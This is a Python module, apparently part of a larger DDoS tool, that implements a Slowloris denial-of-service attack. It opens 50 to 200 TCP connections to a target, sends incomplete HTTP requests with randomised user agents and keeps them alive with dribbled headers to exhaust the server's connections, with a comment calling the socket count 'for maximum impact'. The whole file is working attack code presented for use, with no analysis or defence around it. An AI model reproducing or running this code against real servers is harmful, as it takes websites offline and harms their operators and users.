# Import modules
import random
import socket
import tools.randomData as randomData
from colorama import Fore


def create_socket(target: tuple[str, int]) -> socket.socket | None:
    """Create and initialize a socket for Slowloris attack.
    
    Optimized version with better socket configuration.
    
    Args:
        target: Tuple of (ip_address, port)
        
    Returns:
        Initialized socket or None if failed
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(4)
        sock.connect((target[0], target[1]))

        sock.send(
            f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8")
        )
        sock.send(
            f"User-Agent: {randomData.random_useragent()}\r\n".encode("utf-8")
        )
        sock.send("Acceptlanguage: en-US,en,q=0.5\r\n".encode("utf-8"))
        sock.send("Connection: keep-alive\r\n".encode("utf-8"))
    except socket.timeout:
        print(f"{Fore.RED}[-] {Fore.MAGENTA}Timed out..{Fore.RESET}")
        return None
    except OSError:
        print(f"{Fore.RED}[-] {Fore.MAGENTA}Failed to create socket{Fore.RESET}")
        return None
    else:
        print(f"{Fore.GREEN}[+] {Fore.YELLOW}Socket created..{Fore.RESET}")
        return sock


def flood(target: tuple[str, int]) -> None:
    """Execute Slowloris attack on target.
    
    Optimized version with increased socket count and better socket management.
    
    Args:
        target: Tuple of (ip_address, port)
    """
    # Increased socket count for maximum impact
    socket_count = random.randint(50, 200)
    
    # Create sockets
    sockets = []
    for _ in range(socket_count):
        sock = create_socket(target)
        if sock:
            sockets.append(sock)
    
    # Send keep-alive headers
    for _ in range(10):
        # Use list copy to safely remove failed sockets
        for sock in sockets[:]:
            try:
                sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
            except OSError:
                print(
                    f"{Fore.RED}[-] {Fore.MAGENTA}Failed to send keep-alive headers{Fore.RESET}"
                )
                sockets.remove(sock)
            else:
                print(
                    f"{Fore.GREEN}[+] {Fore.YELLOW}Sending keep-alive headers to {target[0]}:{target[1]}.{Fore.RESET}"
                )
    
    # Cleanup sockets
    for sock in sockets:
        try:
            sock.close()
        except OSError:
            pass
